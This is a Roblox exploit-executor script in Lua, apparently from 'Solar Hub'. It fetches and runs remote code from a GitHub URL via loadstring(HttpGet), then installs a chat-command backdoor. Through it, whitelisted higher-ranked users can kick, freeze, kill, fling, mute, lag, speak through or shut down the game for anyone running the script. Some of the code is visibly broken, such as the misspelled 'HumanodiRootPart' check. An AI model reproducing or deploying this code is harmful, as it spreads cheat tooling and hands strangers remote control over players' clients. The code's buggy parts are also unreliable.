local clonerefs = getgenv().cloneref and typeof(getgenv().cloneref) and getgenv().cloneref or function(...) return ... end

local Whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/xrvili/Premium/refs/heads/main/whitelisted.lua"))()
local Priority = loadstring(game:HttpGet("https://raw.githubusercontent.com/xrvili/Premium/refs/heads/main/priority.lua"))()

local TextChatService = clonerefs(game:GetService("TextChatService"))
local RobloxReplicatedStorage = clonerefs(game:GetService("RobloxReplicatedStorage"))
local Players = clonerefs(game:GetService("Players"))
local NetworkSettings = clonerefs(settings():GetService("NetworkSettings"))

local TextChannels = TextChatService:WaitForChild("TextChannels")
local DefaultChannel = TextChannels:WaitForChild("RBXGeneral")
local MessageBar = TextChatService:WaitForChild("ChatInputBarConfiguration")

local WhisperRemote = RobloxReplicatedStorage:WaitForChild("ExperienceChat"):WaitForChild("WhisperChat")

local Cache = {}
local RNG = Random.new()
local Prefix = "/"

local Character = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
local HumanoidRootPart = Character and Character.PrimaryPart
local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")

local LocalRank = Whitelist[Players.LocalPlayer.UserId] and Whitelist[Players.LocalPlayer.UserId].Rank:lower()
local LocalPriority = LocalRank and Priority[LocalRank] or 0

local function Whisper(UserId: number, Message: string)
    if not UserId or not Message then
        return
    end

    local First = math.min(UserId, Players.LocalPlayer.UserId)
    local Second = math.max(UserId, Players.LocalPlayer.UserId)

    WhisperRemote:InvokeServer(UserId)
    local Channel = TextChannels:WaitForChild("RBXWhisper:"..First.."_"..Second,3)

    if not Channel then
        warn("Failed to create/find whisper channel.")
        return
    end

    task.wait() -- wait for channel load

    Channel:SendAsync("")
    Channel:SendAsync(Message)
end

local function CreateLogo(Head: BasePart, AssetId: string)
    if not Head or not AssetId then
        return
    end

    local BillboardGui = Instance.new("BillboardGui")
    BillboardGui.Parent = Head
    BillboardGui.Size = UDim2.new(2,0,2,0)
    BillboardGui.StudsOffset = Vector3.new(0,2.5,0)
    BillboardGui.MaxDistance = 400
    BillboardGui.AlwaysOnTop = true

    local ImageLabel = Instance.new("ImageLabel")
    ImageLabel.Parent = BillboardGui
    ImageLabel.Size = UDim2.new(1,0,1,0)
    ImageLabel.Image = AssetId
    ImageLabel.BackgroundTransparency = 1
end

local Commands = {
    ["check"] = {
        Restricted = {},
        Callback = function(Sender: Player)
            Whisper(Sender.UserId, "I am using Solar Hub")
        end
    },

    ["mute"] = {
        Restricted = {},
        Callback = function()
            MessageBar.TargetTextChannel = nil
        end
    },

    ["unmute"] = {
        Restricted = {},
        Callback = function()
            MessageBar.TargetTextChannel = DefaultChannel
        end
    },

    ["kick"] = {
        Restricted = {},
        Callback = function(Sender: Player)
            Players.LocalPlayer:Kick("Kicked by "..Sender.Name)
        end
    },

    ["freeze"] = {
        Restricted = {},
        Callback = function()
            if Cache.Voided or not HumanoidRootPart then
                return
            end
            Cache.Frozen = true
            HumanoidRootPart.Anchored = true
        end
    },

    ["unfreeze"] = {
        Restricted = {},
        Callback = function()
            if Cache.Voided or not HumanoidRootPart then
                return
            end
            Cache.Frozen = nil
            HumanoidRootPart.Anchored = false
        end
    },

    ["bring"] = {
        Restricted = {},
        Callback = function(Sender: Player)
            TargetHumanoidRootPart = Players:FindFirstChild(Sender.Name) and Players[Sender.Name].Character and Players[Sender.Name].Character.PrimaryPart
            if not TargetHumanoidRootPart or not HumanoidRootPart then
                return
            end
            Cache.CFrame = HumanoidRootPart.CFrame
            HumanoidRootPart.CFrame = TargetHumanoidRootPart.CFrame
        end
    },

    ["unbring"] = {
        Restricted = {},
        Callback = function(Sender: Player)
            if not Cache.CFrame or not HumanoidRootPart then
                return
            end
            HumanoidRootPart.CFrame = Cache.CFrame
            Cache.CFrame = nil
        end
    },

    ["talk"] = {
        Restricted = {},
        Callback = function(_, Message: string)
            DefaultChannel:SendAsync(Message)
        end
    },

    ["kill"] = {
        Restricted = {},
        Callback = function()
            if not Humanoid then
                return
            end
            Humanoid.Health = 0
        end
    },

    ["sit"] = {
        Restricted = {},
        Callback = function()
            if not Humanoid then
                return
            end
            Humanoid.Sit = true
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
        end
    },

    ["unsit"] = {
        Restricted = {},
        Callback = function()
            if not Humanoid then
                return
            end
            Humanoid.Sit = false
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
        end
    },

    ["void"] = {
        Restricted = {},
        Callback = function()
            if Cache.Frozen or not HumanodiRootPart then
                return
            end
            Cache.Voided = true
            Cache.VoidCFrame = HumanoidRootPart.CFrame
            HumanoidRootPart.CFrame = Cache.VoidCFrame * CFrame.new(0,-15,0)
            task.wait()
            HumanoidRootPart.Anchored = true
        end
    },

    ["unvoid"] = {
        Restricted = {},
        Callback = function()
            if Cache.Frozen or not HumanodiRootPart then
                return
            end
            HumanoidRootPart.CFrame = Cache.VoidCFrame
            task.wait()
            HumanoidRootPart.Anchored = true
            Cache.Voided = nil
            Cache.VoidCFrame = nil
        end
    },

    ["close"] = {
        Restricted = {},
        Callback = function()
            game:Shutdown()
        end
    },

    ["fling"] = {
        Restricted = {},
        Callback = function()
            if not HumanoidRootPart or not Humanoid then
                return
            end
            HumanoidRootPart.AssemblyLinearVelocity = RNG:NextUnitVector() * 10000000
            HumanoidRootPart.AssemblyAngularVelocity = RNG:NextUnitVector() * 10000000
            task.delay(5,function()
                if not Humanoid then
                    return
                end
                Humanoid.Health = 0
            end)
        end
    },

    ["lag"] = {
        Restricted = {"Premium"},
        Callback = function(_, Message: string)
            local amount = string.match(Message,"-?%d+%.?%d*")
            if not amount then
                return
            end
            NetworkSettings.IncomingReplicationLag = math.clamp(amount,0,10000)/1000
        end
    },
}

TextChatService.MessageReceived:Connect(function(Data: TextChatMessage)
    local TargetRank = Data.TextSource and Whitelist[Data.TextSource.UserId] and Whitelist[Data.TextSource.UserId].Rank:lower()
    local TargetPriority = TargetRank and Priority[TargetRank] or 0

    if not TargetRank or TargetPriority <= LocalPriority or Data.TextSource == Players.LocalPlayer.UserId then
        return
    end

    local CommandInfo, CommandName
    for i, v in pairs(Commands) do
        if string.find(Data.Text:lower(), Prefix..i) then
            CommandInfo = v
            CommandName = Prefix..i
            break
        end
    end

    if not CommandInfo then
        return
    end

    for i, v in ipairs(CommandInfo.Restricted) do
        if string.find(TargetRank, v:lower()) then
            return
        end
    end

    CommandInfo.Callback(Data.TextSource,string.gsub(Data.Text,CommandName,""))
end)

Players.LocalPlayer.CharacterAdded:Connect(function(char)
    while not char.PrimaryPart do
        task.wait()
    end
    HumanoidRootPart = char.PrimaryPart
    Humanoid = char:FindFirstChildOfClass("Humanoid")
    Cache = {}
end)

for i, v in ipairs(Players:GetPlayers()) do
    if Whitelist[v.UserId] then
        local Head = v.Character and v.Character:FindFirstChild("Head")
        if Head then
            CreateLogo(Head, Whitelist[v.UserId].Logo)
        end

        v.CharacterAdded:Connect(function(chr)
            local Head = chr:WaitForChild("Head",2)
            if Head then
                CreateLogo(Head, Whitelist[v.UserId].Logo)
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(v)
    if Whitelist[v.UserId] then
        local Head = v.Character and v.Character:FindFirstChild("Head")
        if Head then
            CreateLogo(Head, Whitelist[v.UserId].Logo)
        end

        v.CharacterAdded:Connect(function(chr)
            local Head = chr:WaitForChild("Head",2)
            if Head then
                CreateLogo(Head, Whitelist[v.UserId].Logo)
            end
        end)
    end
end)
